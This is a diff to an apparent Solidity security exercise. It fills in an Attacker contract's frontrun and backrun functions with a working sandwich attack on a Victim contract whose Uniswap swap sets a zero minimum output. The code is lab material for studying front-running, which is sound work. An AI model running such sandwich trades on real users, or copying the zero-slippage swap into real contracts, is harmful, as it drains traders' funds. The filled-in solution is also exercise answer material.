@@ -15,13 +15,51 @@ import "./interfaces/IERC20.sol";
  */
 contract Attacker {
     // This function will be called before the victim's transaction.
-    function frontrun(address router, address weth, address usdc, uint256 deadline) public {
+    function frontrun(
+        address router,
+        address weth,
+        address usdc,
+        uint256 deadline
+    ) public {
         // your code here
+        // We want to do the swap in the same direction as theirs to start off -
+        // So swap WETH for USDC
+        address[] memory path = new address[](2);
+        path[0] = weth;
+        path[1] = usdc;
+
+        IERC20(weth).approve(router, 1000 ether);
+        IUniswapV2Router(router).swapExactTokensForTokens(
+            1000 ether,
+            0,
+            path,
+            address(this),
+            deadline
+        );
     }
 
     // This function will be called after the victim's transaction.
-    function backrun(address router, address weth, address usdc, uint256 deadline) public {
+    function backrun(
+        address router,
+        address weth,
+        address usdc,
+        uint256 deadline
+    ) public {
         // your code here
+
+        // Now just do the swap in the opposite direction
+        // need our USDC balance, swap it all back
+        uint swapAmount = IERC20(usdc).balanceOf(address(this));
+        address[] memory path = new address[](2);
+        path[0] = usdc;
+        path[1] = weth;
+        IUniswapV2Router(router).swapExactTokensForTokens(
+            swapAmount,
+            0,
+            path,
+            address(this),
+            deadline
+        );
     }
 }
 
@@ -33,7 +71,13 @@ contract Victim {
     }
 
     function performSwap(address[] calldata path, uint256 deadline) public {
-        IUniswapV2Router(router).swapExactTokensForTokens(1000 * 1e18, 0, path, address(this), deadline);
+        IUniswapV2Router(router).swapExactTokensForTokens(
+            1000 * 1e18,
+            0,
+            path,
+            address(this),
+            deadline
+        );
     }
 }
 
